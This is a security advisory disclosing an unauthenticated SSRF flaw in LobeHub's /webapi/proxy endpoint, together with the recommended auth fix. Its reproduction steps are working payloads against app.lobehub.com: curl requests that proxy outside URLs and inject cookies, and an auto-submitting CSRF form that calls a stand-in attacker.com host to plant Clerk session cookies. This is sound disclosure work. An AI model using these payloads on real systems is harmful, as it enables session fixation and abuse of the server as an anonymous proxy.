# [C] LobeHub: Unauthenticated SSRF in `/webapi/proxy`

## Summary
Severity: Critical
Advisory: GHSA-xmwj-c75x-6346
CVE: CVE-2026-54157
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:H (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-xmwj-c75x-6346
Type: github-advisory

## Affected
- npm: `@lobehub/lobehub` — affected >=0 <2.1.57

## Details
## Unauthenticated SSRF in /webapi/proxy allows anyone to proxy requests and inject cookies on lobehub.com

## Summary

The `/webapi/proxy` endpoint on app.lobehub.com accepts a URL in the POST body and fetches it server-side without any authentication. This is the same proxy code that was vulnerable in CVE-2024-32964, where `/api/proxy` was fixed by adding auth middleware. The `/webapi/proxy` route was never secured — it is the only webapi route missing the `checkAuth()` wrapper. An attacker can use this to make arbitrary outbound requests from LobeHub's infrastructure, leak Vercel deployment details, and inject cookies on the `lobehub.com` domain through reflected `Set-Cookie` headers.

## Vulnerability Details

**Type:** Server-Side Request Forgery (CWE-918)
**Affected Endpoint:** POST /webapi/proxy
**Vulnerable File:** `src/app/(backend)/webapi/proxy/route.ts`

The route handler reads a URL from the request body and passes it to `ssrfSafeFetch()` without calling `checkAuth()` first. Every other webapi route (`/webapi/chat/*`, `/webapi/models/*`, `/webapi/create-image/*`) wraps the handler in `checkAuth()`, but the proxy does not. The Next.js middleware also skips `/webapi/` routes — `defaultMiddleware()` calls `NextResponse.next()` for any path starting with `/webapi/`, so neither the route handler nor the middleware performs authentication.

## Steps to Reproduce

**Fetch an external URL through the proxy (no auth, no cookies, no tokens):**

```
curl -X POST -H "Content-Type: text/plain;charset=UTF-8" \
  -d "https://httpbin.org/ip" \
  "https://app.lobehub.com/webapi/proxy"
```
<img width="1069" height="297" alt="image" src="https://github.com/user-attachments/assets/4fa7ffe9-fe4f-4752-875a-cb3fa79c3c18" />

Response:

```json
{"origin": "3.14.141.44"}
```

This is the IP of LobeHub's Vercel serverless function. The proxy fetched httpbin.org and returned the full response body.

**Inject a cookie on the lobehub.com domain:**

```
curl -D- -X POST -H "Content-Type: text/plain;charset=UTF-8" \
  -d "https://httpbin.org/response-headers?Set-Cookie=__session%3Dmalicious%3BPath%3D%2F%3BDomain%3Dlobehub.com%3BSecure%3BHttpOnly" \
  "https://app.lobehub.com/webapi/proxy"
```

The response headers include:

```
set-cookie: __session=malicious;Path=/;Domain=lobehub.com;Secure;HttpOnly
```
<img width="1215" height="340" alt="image" src="https://github.com/user-attachments/assets/f0710685-edb8-4cc9-8162-27f0ba911903" />

The proxy passes upstream response headers straight through (only stripping `Content-Encoding` and `Content-Length`). An attacker controls the upstream server, so they control which `Set-Cookie` headers are reflected. The `__session` and `__clerk_db_jwt` cookies are both injectable — these are the cookie names used by Clerk for authentication.

**CSRF to cookie injection (no user interaction beyond visiting a page):**

An attacker hosts the following HTML. When a victim opens it, the browser submits a form to the proxy, which fetches the attacker's server. The attacker's server responds with a `Set-Cookie` header, and the proxy reflects it. The victim's browser sets the cookie on `lobehub.com` because the response comes from `app.lobehub.com`.

```html
<form id=f action="https://app.lobehub.com/webapi/proxy"
  method=POST enctype="text/plain">
  <input name="https://attacker.com/inject?x" value="">
</form>
<script>f.submit()</script>
```

The attacker's server at `/inject?x=` responds with `Set-Cookie: __session=KNOWN_VALUE; Path=/; Domain=lobehub.com; Secure; HttpOnly`. The proxy reflects this header and the victim's browser stores the cookie.

## Impact

The proxy is fully unauthenticated and returns the complete response from any external URL. I confirmed the following on app.lobehub.com:

An attacker can inject authentication cookies (`__session`, `__clerk_db_jwt`, `__client_uat`) on the `lobehub.com` domain by chaining CSRF with the proxy's reflected `Set-Cookie` headers. If LobeHub uses Clerk for session management, this is a session fixation vector — the attacker sets a known session value before the victim logs in, then uses that same value to access the victim's session.

The proxy also leaks Vercel infrastructure details. The `Traceparent` and `X-Vercel-Id` headers from internal request tracing appear in every proxied response. The server's egress IP is exposed. Vercel Edge Config and the Vercel API are both reachable through the proxy (they return auth errors, not SSRF blocks), which means the proxy reaches Vercel's management plane.

The endpoint has no rate limiting. An attacker can use LobeHub's infrastructure as an anonymous proxy for scanning, phishing, or abusing IP-based trust relationships with third-party services.

## Recommended Fix

Add `checkAuth()` to the proxy route, matching every other webapi route:

```diff
- export const POST = async (req: Request) => {
+ export const POST = checkAuth(async (req, { userId }) => {
```

If the proxy is only needed for client-side URL previews, consider removing the endpoint entirely and handling previews in the browser.

## References
- https://github.com/lobehub/lobehub/security/advisories/GHSA-xmwj-c75x-6346
- https://nvd.nist.gov/vuln/detail/CVE-2026-54157
- https://github.com/lobehub/lobehub
